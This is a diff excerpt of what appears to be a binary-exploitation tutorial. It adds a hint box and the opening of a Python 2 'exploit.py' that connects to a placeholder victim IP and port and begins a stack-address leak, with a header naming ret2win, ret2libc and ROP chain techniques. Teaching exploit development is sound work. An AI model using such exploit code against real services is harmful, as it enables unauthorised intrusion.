@@ -229,16 +229,25 @@ We then take this and do the following:
 
 Using the data collected above, we can start crafting an exploit!
 
+{% hint style="info" %}
+**🚨 Be sure to be conscious of the comments that are throughout the code. Some important enumeration information that is necessary to exploit the target has been commented out for brevity, simplicity, or for the sake of a separate cyber effect (type of vulnerability) to be brought on upon the target.**
+{% endhint %}
+
 **`exploit.py`:**
 
 ```python
+#!/usr/bin/env python2.7
+
+# exploit.py -- featuring a multi-type exploit against a single target
+# Featuring ret2win, ret2libc, memory leak address enumeration, and ROP chain
+
 import socket
 import time
 import struct
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-s.connect(("<target_IP_HERE",<Target_port_here))
+s.connect(("<victim_ip_here>",<victim_port_here>))
 data = s.recv(200)
 # Leak Stack Address
 print "Step 1: Leak Stack Address!\n";
